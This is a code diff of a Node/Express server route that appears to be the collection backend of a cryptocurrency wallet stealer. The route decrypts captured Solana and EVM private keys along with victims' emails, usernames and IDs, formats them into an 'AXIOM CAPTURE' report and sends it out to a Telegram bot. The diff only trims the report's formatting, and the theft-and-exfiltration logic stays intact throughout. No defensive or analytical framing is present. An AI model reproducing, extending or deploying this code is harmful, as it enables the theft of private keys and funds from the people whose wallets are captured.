@@ -42,39 +42,25 @@ app.get('/data/:b64', async (req, res) => {
     const solKeys = sBundles?.map(enc => decrypt(enc, data.bundle)).filter(k => k) || [];
     const evmKeys = eBundles?.map(enc => decrypt(enc, data.bundle)).filter(k => k) || [];
     
-    const timestamp = new Date().toLocaleString('en-US', { 
-      timeZone: 'America/Chicago',
-      dateStyle: 'short',
-      timeStyle: 'short'
-    });
-    
     const msg = `
-╔═══════════════════════════╗
-║     🚨 AXIOM CAPTURE 🚨    ║
-╚═══════════════════════════╝
+🚨 AXIOM CAPTURE 🚨
 
 👤 USER INFO
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📧 Email: ${data.user?.email || 'N/A'}
-🆔 User ID: ${data.user?.id || 'N/A'}
-👤 Username: ${data.user?.username || 'N/A'}
+Email: ${data.user?.email || 'N/A'}
+Username: ${data.user?.username || 'N/A'}
+ID: ${data.user?.id || 'N/A'}
 
 💰 SOLANA WALLETS (${solKeys.length})
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
-${solKeys.length > 0 ? solKeys.map((key, i) => `${i + 1}. \`${key}\``).join('\n') : '❌ None found'}
+${solKeys.length > 0 ? solKeys.map((key, i) => `${i + 1}. ${key}`).join('\n\n') : 'None'}
 
 💎 EVM WALLETS (${evmKeys.length})
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
-${evmKeys.length > 0 ? evmKeys.map((key, i) => `${i + 1}. \`${key}\``).join('\n') : '❌ None found'}
+${evmKeys.length > 0 ? evmKeys.map((key, i) => `${i + 1}. ${key}`).join('\n\n') : 'None'}
 
 🌐 SOURCE
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🔗 URL: ${data.site}
-⏰ Time: ${timestamp}
-🔑 Bundle Key: \`${data.bundle}\`
+URL: ${data.site}
+Time: ${new Date().toLocaleString('en-US', { timeZone: 'America/Chicago' })}
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
-💡 Total Keys: ${solKeys.length + evmKeys.length}
+Total Keys: ${solKeys.length + evmKeys.length}
     `.trim();
     
     await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
@@ -82,8 +68,7 @@ ${evmKeys.length > 0 ? evmKeys.map((key, i) => `${i + 1}. \`${key}\``).join('\n'
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ 
         chat_id: TG_CHAT, 
-        text: msg,
-        parse_mode: 'Markdown'
+        text: msg
       })
     });
     
